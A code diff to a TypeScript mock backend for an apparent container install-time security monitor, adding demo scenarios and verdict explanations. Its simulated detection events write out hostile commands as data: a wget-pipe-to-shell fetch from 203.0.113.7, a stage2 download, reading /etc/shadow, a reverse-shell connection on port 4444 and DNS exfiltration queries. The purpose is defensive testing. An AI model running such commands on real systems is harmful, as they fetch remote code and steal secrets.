@@ -7,8 +7,11 @@ import type {
   Change,
   DecisionEffect,
   DecisionPreview,
+  DemoDecider,
+  DemoExplain,
   DemoRun,
   DemoScenario,
+  DemoSequence,
   DemoState,
   Event,
   Evidence,
@@ -24,6 +27,7 @@ import type {
   ProposalChange,
   Rule,
   SequenceHit,
+  SequenceStep,
   Stats,
   Summary,
   Timeline,
@@ -145,7 +149,8 @@ export function timeline(detectedAt: number, o: Partial<{ matchMs: number; evide
   if (v.notifyMs != null) t.notifiedAt = at(v.notifyMs);
   return t;
 }
-export const DEMO_SCENARIOS: DemoScenario[] = ['all', 'shell', 'revshell', 'direct-ip', 'domain', 'dns-exfil'];
+// R3 11/04: 백엔드 GET /api/demo scenarios 와 같은 8개(정상 대조군 benign · 연쇄 chain 포함)
+export const DEMO_SCENARIOS: DemoScenario[] = ['all', 'shell', 'revshell', 'direct-ip', 'domain', 'dns-exfil', 'benign', 'chain'];
 // Run 객체(계약 §2) — unix 초 기준 id · 컨테이너 이름
 export function demoRun(scenario: DemoScenario, installId: string, unix = Math.floor(Date.now() / 1000)): DemoRun {
   return { id: `demo-${unix}`, scenario, container: `sg-install-demo-${unix}`, installId, startedAt: new Date(unix * 1000).toISOString(), finishedAt: null, status: 'running', exitCode: null, simulated: true };
@@ -200,6 +205,8 @@ export class MockBackend {
   demoDown = false;
   demoRefused = false;
   demoStepMs = 250; // 모의 재생 간격
+  // R3 11/04: GET /api/demo 의 Run.explain(backend demo/explain.go 모양) — false 면 옛 백엔드처럼 explain 없음. 테스트가 run.explain 을 직접 넣으면 그대로 둔다
+  demoExplain = true;
   private demoTimers: number[] = [];
   // 10/30: 수집량에 dns 를 넣을지(enableDns) — 기본은 옛 백엔드처럼 없음
   dnsCollected = false;
@@ -520,6 +527,48 @@ export class MockBackend {
     this.audit.unshift({ ...won, id: top + 1, caseId: null, install: null });
     return this;
   }
+  // R3 11/04: Run.explain — backend demo/explain.go BuildExplain 과 같은 규칙. 세션 위반 중 가장 강한 판정(같으면 이른 것) + 지금 정책의 설명 · 조건,
+  // chain 이면 연쇄 규칙(정책에 없으면 기본 정책 chain-download-secrets)의 단계별 진행. 세션이 없거나 거부면 explain 없음
+  private demoExplainOf(run: DemoRun): DemoExplain | undefined {
+    if (!run.installId || run.status === 'refused') return undefined;
+    const s = this.installs.find((x) => x.id === run.installId);
+    if (!s) return undefined;
+    const rank: Record<Level, number> = { normal: 0, alert: 1, held: 2, killed: 3 };
+    let best: InstallViolation | null = null;
+    for (const v of s.violations ?? []) {
+      if (!best) best = v;
+      else {
+        const a = rank[levelOf(v)], b = rank[levelOf(best)];
+        if (a > b || (a === b && v.event.timestamp < best.event.timestamp)) best = v;
+      }
+    }
+    const rule = best && this.rules.find((r) => r.id === best.ruleId);
+    const e = best?.event;
+    const decidedBy: DemoDecider | null = best && e
+      ? {
+          ruleId: best.ruleId ?? '', description: rule?.description ?? '', condition: rule ? ruleCondition(rule) : '', action: best.action ?? 'alert', dryRun: !!best.dryRun, enforced: !!best.enforced, reason: best.reason ?? '',
+          event: { kind: e.kind, timestamp: e.timestamp, comm: e.comm, pid: e.pid, args: e.args ?? '', path: e.path ?? '', dstIp: e.dstIp ?? '', dstPort: e.dstPort ?? 0, dstHost: e.dstHost ?? '', qtype: e.qtype ?? '' },
+          ...(best.sequence ? { sequence: best.sequence.ruleId } : {}),
+        }
+      : null;
+    let sequence: DemoSequence | null = null;
+    if (run.scenario === 'chain') {
+      const r = this.rules.find((x) => x.id === SEQ_RULE_ID && x.kind === 'sequence') ?? this.rules.find((x) => x.kind === 'sequence') ?? sequenceRule();
+      const steps = r.steps ?? [];
+      const evs = (s.violations ?? []).map((v) => v.event).sort((a, b) => a.timestamp.localeCompare(b.timestamp));
+      const got: SequenceStep[] = [];
+      for (const x of evs) {
+        if (got.length === steps.length) break;
+        if (got.length && Date.parse(x.timestamp) - Date.parse(got[0].timestamp) > (r.windowSeconds ?? 0) * 1000) break;
+        if (stepMatches(steps[got.length], x)) got.push({ kind: x.kind, timestamp: x.timestamp, comm: x.comm, pid: x.pid, detail: eventDetail(x) });
+      }
+      sequence = {
+        ruleId: r.id, description: r.description ?? '', action: r.action, dryRun: !!r.dryRun, disabled: !!r.disabled, windowSeconds: r.windowSeconds ?? 0, completed: false,
+        steps: steps.map((st, i) => ({ kind: st.kind, condition: ruleCondition(st), matched: !!got[i], event: got[i] ?? null, gapMs: i > 0 && got[i] ? Date.parse(got[i].timestamp) - Date.parse(got[i - 1].timestamp) : null })),
+      };
+    }
+    return { decidedBy, sequence };
+  }
   // 시연 모의 재생(계약 §2 mock 소스): 세션 → 정상 이벤트 → 시나리오 이벤트 순서대로, 첫 kill 판정에서 멈춘다
   private startDemo(run: DemoRun) {
     const ctr = run.container;
@@ -533,21 +582,21 @@ export class MockBackend {
     const e = (x: Partial<Event> & Pick<Event, 'kind' | 'comm'>) => ev(Date.now(), 0, ctr, PYIMG, x);
     const V: Record<DemoScenario, (() => Verdict)[]> = {
       shell: [
-        () => kill(e({ kind: 'exec', comm: 'sh', args: 'sh -c wget -qO- http://203.0.113.7/p.sh | sh' }), 'pipe-to-shell', '파이프로 셸 실행'),
-        () => kill(e({ kind: 'open', comm: 'python3', path: '/etc/shadow' }), 'sandbox-secrets', '설치 중 비밀 파일'),
+        () => kill(e({ kind: 'exec', comm: 'sh', args: 'sh -c wget -qO- http://203.0.113.7/p.sh | sh' }), 'pipe-to-shell', '금지 인자 패턴: | sh'),
+        () => kill(e({ kind: 'open', comm: 'python3', path: '/etc/shadow' }), 'sandbox-secrets', '민감 파일 접근: /etc/shadow'),
       ],
-      revshell: [() => kill(e({ kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 4444 }), 'reverse-shell-ports', '리버스 셸 포트 4444')],
-      'direct-ip': [() => kill(e({ kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 443 }), 'sandbox-egress', '설치 중 외부 통신')],
+      revshell: [() => kill(e({ kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 4444 }), 'reverse-shell-ports', '금지 포트 연결: 203.0.113.7:4444')],
+      'direct-ip': [() => kill(e({ kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 443 }), 'sandbox-egress', '허용 목록 밖 외부 연결: 203.0.113.7:443')],
       domain: [
         () => ({ ...kill(e({ kind: 'dns', comm: 'python3', dstHost: 'example.com', qtype: 'A', dstIp: '127.0.0.11', dstPort: 53 }), 'sandbox-dns', '허용 목록 밖 도메인 질의: example.com (A)'), enforced: false, dryRun: true }),
-        () => kill(e({ kind: 'connect', comm: 'python3', dstIp: '93.184.216.34', dstPort: 443, dstHost: 'example.com' }), 'sandbox-egress', '설치 중 외부 통신'),
+        () => kill(e({ kind: 'connect', comm: 'python3', dstIp: '93.184.216.34', dstPort: 443, dstHost: 'example.com' }), 'sandbox-egress', '허용 목록 밖 외부 연결: 93.184.216.34:443 (example.com)'),
       ],
       'dns-exfil': [
         () => alert(e({ kind: 'dns', comm: 'python3', dstHost: DNS_EXFIL_NAME, qtype: 'A', dstIp: '127.0.0.11', dstPort: 53 }), 'runtime-dns-exfil', `긴 DNS 라벨(유출 의심): ${DNS_EXFIL_NAME} (라벨 48자 > 40)`),
         () => alert(e({ kind: 'dns', comm: 'python3', dstHost: 'data.exfil.example', qtype: 'TXT', dstIp: '127.0.0.11', dstPort: 53 }), 'runtime-dns-exfil', '금지 질의 유형: TXT — data.exfil.example'),
       ],
       benign: [], // 11/04: 정상 대조군 — 위반 없음
-      chain: [() => kill(e({ kind: 'exec', comm: 'wget', args: 'wget -q -O /dev/null http://203.0.113.7/stage2' }), 'no-shell-download', '외부 다운로드 도구 실행')], // 11/04: 기본 정책은 1단계에서 격리
+      chain: [() => kill(e({ kind: 'exec', comm: 'wget', args: 'wget -q -O /dev/null http://203.0.113.7/stage2' }), 'no-shell-download', '금지 프로세스 실행: wget')], // 11/04: 기본 정책은 1단계에서 격리
       all: [],
     };
     V.all = [...V.shell, ...V.revshell, ...V['direct-ip'], ...V.domain, ...V['dns-exfil']];
@@ -600,6 +649,12 @@ export class MockBackend {
         if (v.enforced) {
           stopped = true;
           session.isolation = { auditId: top, timeline: v.timeline! };
+          // R3 11/04: kill 직전 증거(GET /api/evidence?container=) — 로그 3줄 · 파일 변경 2 · 프로세스 2
+          this.evidence.push({
+            id: `ev-${run.id}`, containerId: session.containerId!, containerName: ctr, image: PYIMG, collectedAt: at(), partial: false, durationMs: 295,
+            logs: 'Collecting ./reqeusts\nRunning setup.py install\n[demo] shell start', changes: [{ kind: 'A', path: '/tmp/p.sh' }, { kind: 'C', path: '/etc/hosts' }],
+            processes: [{ pid: 1, user: 'root', cmd: 'pip install /pkg/reqeusts' }, { pid: 4242, user: 'root', cmd: v.event.args ?? v.event.comm }],
+          });
           finish('isolated', 137);
         }
       });
@@ -709,14 +764,18 @@ export class MockBackend {
     // 10/30 시연 실행 API(계약 §2) — DEMO_ENABLED 가 아니면 경로 자체가 없다(404 텍스트)
     if (path === '/demo' || path === '/demo/run') {
       if (!this.info.demo) return route.fulfill({ status: 404, contentType: 'text/plain', body: '404 page not found' });
-      if (method === 'GET' && path === '/demo') return json({ enabled: true, scenarios: DEMO_SCENARIOS, running: this.demo.running, last: this.demo.last } satisfies DemoState);
+      if (method === 'GET' && path === '/demo') {
+        const withExplain = (r: DemoRun | null) => (!r || r.explain !== undefined ? r : { ...r, ...(this.demoExplain ? { explain: this.demoExplainOf(r) } : {}) });
+        return json({ enabled: true, scenarios: DEMO_SCENARIOS, running: withExplain(this.demo.running), last: withExplain(this.demo.last) } satisfies DemoState);
+      }
       if (method === 'POST' && path === '/demo/run') {
         const { scenario } = JSON.parse(body || '{}') as { scenario?: DemoScenario };
-        if (!scenario || !DEMO_SCENARIOS.includes(scenario)) return fail(400, 'scenario: all | shell | revshell | direct-ip | domain | dns-exfil');
+        if (!scenario || !DEMO_SCENARIOS.includes(scenario)) return fail(400, 'scenario: all | shell | revshell | direct-ip | domain | dns-exfil | benign | chain');
         if (this.demo.running) return json({ error: '시연이 이미 실행 중입니다', running: this.demo.running }, 409);
         if (this.demoDown) return fail(503, 'Docker 에 연결할 수 없습니다');
         const n = ++this.seq;
         const run = demoRun(scenario, `ins-${String(n).padStart(4, '0')}`, Math.floor(Date.now() / 1000) + n);
+        run.startedAt = new Date().toISOString(); // R3 11/04: id 는 겹치지 않게 앞당긴 초, 시작 시각은 지금(단계 도착 시각 · +N ms)
         this.addChange('demo_run', `시연 실행: ${scenario}`);
         if (this.demoRefused) {
           // 차단 목록에 pip:reqeusts 가 있으면 sg-install 처럼 설치 전 거부 세션
@@ -1135,4 +1194,52 @@ export function killedVerdict(container: string, reason = '리버스 셸 포트 
 }
 export function normalVerdict(container: string, path: string): Verdict {
   return ok(ev(Date.now(), 0, container, 'demo/x:1', { kind: 'open', comm: 'python', path }));
+}
+
+// R3 11/04: backend demo/explain.go condition() 과 같은 조건 요약 문구
+const PRIVATE = /^(10\.|127\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/;
+export function ruleCondition(st: Omit<Rule, 'id' | 'action'> & { kind: Rule['kind'] }): string {
+  const j = (xs?: (string | number)[]) => (xs ?? []).join(' · ');
+  const parts: string[] = [];
+  const add = (ok: boolean, t: string) => ok && parts.push(t);
+  switch (st.kind) {
+    case 'exec':
+      add(!!st.denyComms?.length, `프로세스 ${j(st.denyComms)}`);
+      add(!!st.denyArgs?.length, `인자 ${j(st.denyArgs)}`);
+      break;
+    case 'open':
+      add(!!st.denyPaths?.length, `경로 ${j(st.denyPaths)}`);
+      add(!!st.allowPaths?.length, `예외 ${j(st.allowPaths)}`);
+      break;
+    case 'connect': {
+      add(!!st.denyPorts?.length, `포트 ${j(st.denyPorts)}`);
+      add(!!st.denyCidrs?.length, `대역 ${j(st.denyCidrs)}`);
+      add(!!st.denyHosts?.length, `도메인 ${j(st.denyHosts)}`);
+      const allow = [...(st.allowPorts?.length ? [`포트 ${j(st.allowPorts)}`] : []), ...(st.allowHosts?.length ? [j(st.allowHosts)] : [])];
+      if (st.allowCidrs?.length && !allow.length) parts.push(`내부망(${j(st.allowCidrs)}) 밖 연결`);
+      else if (st.allowCidrs?.length || allow.length) parts.push(`허용(${[...(st.allowCidrs ?? []), ...allow].join(' · ')}) 밖 연결`);
+      add(!!st.directIp, `도메인 조회 없는 IP 직접 연결(${st.directIp})`);
+      break;
+    }
+    case 'dns':
+      add(!!st.denyHosts?.length, `질의 ${j(st.denyHosts)}`);
+      add(!!st.denyQtypes?.length, `질의 유형 ${j(st.denyQtypes)}`);
+      add(!!st.maxLabelLength, `라벨 ${st.maxLabelLength}자 초과`);
+      add(!!st.maxNameLength, `이름 ${st.maxNameLength}자 초과`);
+      add(!!st.allowHosts?.length, `허용(${j(st.allowHosts)}) 밖 질의`);
+      break;
+    case 'sequence':
+      return `${st.windowSeconds ?? 0}초 안: ${(st.steps ?? []).map((x) => ruleCondition(x)).join(' → ')}`;
+  }
+  return parts.join(' / ');
+}
+const eventDetail = (e: Event) =>
+  e.kind === 'exec' ? e.args || e.comm : e.kind === 'open' ? (e.path ?? '') : e.kind === 'dns' ? `${e.dstHost ?? ''} (${e.qtype ?? ''})` : e.dstHost ? `${e.dstIp}:${e.dstPort} (${e.dstHost})` : `${e.dstIp}:${e.dstPort}`;
+// 연쇄 단계 조건(간이) — exec 프로세스 · 인자, open 경로 앞부분, connect 내부망 밖 · 금지 포트
+function stepMatches(st: NonNullable<Rule['steps']>[number] | undefined, e: Event): boolean {
+  if (!st || st.kind !== e.kind) return false;
+  if (e.kind === 'exec') return !!st.denyComms?.includes(e.comm) || !!st.denyArgs?.some((a) => (e.args ?? '').includes(a));
+  if (e.kind === 'open') return !!st.denyPaths?.some((p) => (e.path ?? '').startsWith(p.replace(/\*.*$/, '')));
+  if (e.kind === 'connect') return !!st.denyPorts?.includes(e.dstPort ?? 0) || (!!st.allowCidrs?.length && !PRIVATE.test(e.dstIp ?? ''));
+  return false;
 }
